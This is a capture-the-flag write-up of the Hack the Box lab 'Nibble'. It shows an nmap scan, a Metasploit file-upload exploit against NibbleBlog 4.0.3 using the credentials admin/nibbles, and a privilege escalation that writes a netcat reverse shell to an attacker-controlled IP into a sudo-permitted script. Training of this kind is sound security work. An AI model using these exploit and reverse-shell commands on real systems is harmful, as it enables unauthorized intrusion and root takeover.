@@ -1,0 +1,334 @@
+
+								
+																		Hack the Box Challenge: Nibble Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 2, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Nibble” which is categories as retired lab presented by Hack the Box for making online penetration practices. 
+Level: Easy
+Task: find user.txt and root.txt file on the victim’s machine.
+Penetration Methodology
+Scanning
+
+Open ports and running services (Nmap)
+
+Enumeration
+
+Nibbleblog-CMS
+
+Exploit NibbleBlog 4.0.3
+
+Code Execution by uploading the PHP file (Metasploit)
+Get User.txt
+
+Privilege Escalation
+
+Get root.txt 
+
+Walkthrough 
+Since these labs are online accessible therefore they have static IP. The IP of Nibble is 10.10.10.75 so let’s initiate with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.75
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.75
+					
+				
+			
+		
+
+As you can see in the given screenshot that we have two services running on our Target Machine, ssh and HTTP on ports 22 and 80 respectively.
+
+The Port 80 is open so let’s open IP in out Browser to see that if a website is hosted on the IP. After opening the IP in the browser, we were greeted by the following page.
+
+Then we use curl to send http request on http://10.10.10.75 and notice /nibbleblog/ which could be any web directory.
+
+So we execute the http://10.10.10.75/nibbleblog/ directory put us on the main page of a blogging platform NibbleBlog Yum Yum. Without wasting time search for the exploit in the Google and Rapid 7 link for its exploitation.
+
+So we load the Metasploit framework and executed following command to take a meterpreter session of victim’s VM.
+According to this module, Nibbleblog contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code. This module was tested on version 4.0.3.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/http/nibbleblog_file_upload
+msf exploit(multi/http/nibbleblog_file_upload) &gt; set rhost 10.10.10.75
+msf exploit(multi/http/nibbleblog_file_upload) &gt; set username admin
+msf exploit(multi/http/nibbleblog_file_upload) &gt; set password nibbles
+msf exploit(multi/http/nibbleblog_file_upload) &gt; set targeturi /nibbleblog
+msf exploit(multi/http/nibbleblog_file_upload) &gt; exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/multi/http/nibbleblog_file_uploadmsf exploit(multi/http/nibbleblog_file_upload) &gt; set rhost 10.10.10.75msf exploit(multi/http/nibbleblog_file_upload) &gt; set username adminmsf exploit(multi/http/nibbleblog_file_upload) &gt; set password nibblesmsf exploit(multi/http/nibbleblog_file_upload) &gt; set targeturi /nibbleblogmsf exploit(multi/http/nibbleblog_file_upload) &gt; exploit
+					
+				
+			
+		
+
+From given below image you can observe meterpreter session 1 opened for accessing victim tty shell.
+Now let’s finish the task by grabbing user.txt and root.txt file. First I move into /home directory and check available files and directories inside it. I found the 1st flag “user.txt” from inside /home/nibbler.
+
+		
+		
+			
+			
+			
+			
+cd /home
+cd /nibbler
+cat user.txt
+			
+				
+					
+				
+					123
+				
+						cd /homecd /nibblercat user.txt
+					
+				
+			
+		
+
+
+For spawning proper tty shell of target’s system we need to import python file, therefore, I run following command inside the meterpreter shell.
+
+		
+		
+			
+			
+			
+			
+shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ls
+			
+				
+					
+				
+					123
+				
+						shellpython3 -c 'import pty;pty.spawn("/bin/bash")'ls
+					
+				
+			
+		
+
+Inside /nibbler there was a zip file so we try to unzip it with help of the following command and after extracting zip file we got a directory “personal”, so we get inside it, then with a little more efforts found a script monitor.sh.
+
+		
+		
+			
+			
+			
+			
+unzip personal.zip
+cd personal
+ls
+cd stuff
+ls -al
+			
+				
+					
+				
+					12345
+				
+						unzip personal.zipcd personallscd stuffls -al
+					
+				
+			
+		
+
+
+Then I check sudo rights for user “nibbler” and notice nibbler has sudo permission for script monitor.sh which means he is authorized to modify this script.
+
+So in a new terminal, we generated a payload for netcat shell with help of msfvenom command as shown and copied the highlighted code and start netcat listener too.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.25 lport=5555 R
+nc -lvp 5555
+			
+				
+					
+				
+					12
+				
+						msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.25 lport=5555 Rnc -lvp 5555
+					
+				
+			
+		
+
+
+Then to it exploit it we move inside following Path: /home/nibbler/personal/stuff/ and paste the above-copied code inside monitor.sh as shown below
+
+		
+		
+			
+			
+			
+			
+cd /home/nibbler/personal/stuff/
+echo "mkfifo /tmp/jswwrii; nc 10.10.14.25 5555 0&lt;/tmp/jswwrii | /bin/sh &gt;/tmp/jswwrii 2&gt;&amp;1; rm /tmp/jswwrii" &gt; monitor.sh
+			
+				
+					
+				
+					12
+				
+						cd /home/nibbler/personal/stuff/echo "mkfifo /tmp/jswwrii; nc 10.10.14.25 5555 0&lt;/tmp/jswwrii | /bin/sh &gt;/tmp/jswwrii 2&gt;&amp;1; rm /tmp/jswwrii" &gt; monitor.sh
+					
+				
+			
+		
+
+Since we knew monitor.sh has full permission, so we can run it to obtain reverse shell along root access.
+
+On other, we have a netcat listener, which has provided root access to us. Let’s finish this task and grab the root.txt file………………………………..
+
+		
+		
+			
+			
+			
+			
+id
+cd /root
+ls
+root.txt
+cat root.txt
+			
+				
+					
+				
+					12345
+				
+						idcd /rootlsroot.txtcat root.txt
+					
+				
+			
+		
+
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								siaka October 4, 2018 at 4:58 am							
+							
+							
+														
+							
+								how did you fid the credential ?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
